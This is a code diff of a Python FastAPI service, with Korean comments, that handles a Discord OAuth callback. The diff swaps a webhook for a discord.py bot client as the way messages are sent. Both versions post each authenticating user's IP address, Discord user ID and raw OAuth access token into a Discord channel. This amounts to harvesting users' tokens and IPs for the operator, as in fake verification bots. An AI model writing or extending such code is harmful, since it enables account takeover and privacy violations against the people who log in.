@@ -1,6 +1,9 @@
+# main.py (채널 전송용)
 from fastapi import FastAPI, Request
 import aiohttp
 import os
+import asyncio
+import discord
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -10,31 +13,37 @@ app = FastAPI()
 CLIENT_ID = os.getenv("CLIENT_ID")
 CLIENT_SECRET = os.getenv("CLIENT_SECRET")
 REDIRECT_URI = os.getenv("REDIRECT_URI")
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHANNEL_ID = int(os.getenv("ALERT_CHANNEL_ID"))
 
 authenticated_users = {}
 
+# ⚠️ 디스코드 클라이언트 준비 (메시지 전송용)
+discord_client = discord.Client(intents=discord.Intents.default())
+loop = asyncio.get_event_loop()
+
+@discord_client.event
+async def on_ready():
+    print(f"🤖 디스코드 클라이언트 로그인됨: {discord_client.user}")
+
+loop.create_task(discord_client.start(BOT_TOKEN))
+
 async def send_ip_to_discord(ip, user_id, access_token):
-    print("📤 웹훅 전송 시도 중...")
-    print(f"🔗 웹훅 URL 확인: {WEBHOOK_URL}")
-    async with aiohttp.ClientSession() as session:
-        res = await session.post(WEBHOOK_URL, json={
-            "content": (
-                f"🆕 인증 성공!\n"
-                f"🕵️‍♂️ IP: `{ip}`\n"
-                f"🆔 User ID: `{user_id}`\n"
-                f"🔐 Access Token: `{access_token}`"
-            )
-        })
-        print(f"📨 웹훅 응답 상태: {res.status}")
-        if res.status not in (200, 204):
-            error = await res.text()
-            print(f"❌ 웹훅 전송 실패: {error}")
+    print("📤 인증 메시지 전송 시도 중...")
+    channel = discord_client.get_channel(CHANNEL_ID)
+    if channel:
+        await channel.send(
+            f"🆕 인증 성공!\n"
+            f"🕵️‍♂️ IP: `{ip}`\n"
+            f"🆔 User ID: `{user_id}`\n"
+            f"🔐 Access Token: `{access_token}`"
+        )
+    else:
+        print("❌ 채널을 찾을 수 없습니다. ID 확인 요망.")
 
 @app.get("/callback")
 async def callback(request: Request):
     print("✅ [callback] 시작됨")
-
     code = request.query_params.get("code")
     client_ip = request.client.host
     print(f"🔑 code: {code}, IP: {client_ip}")
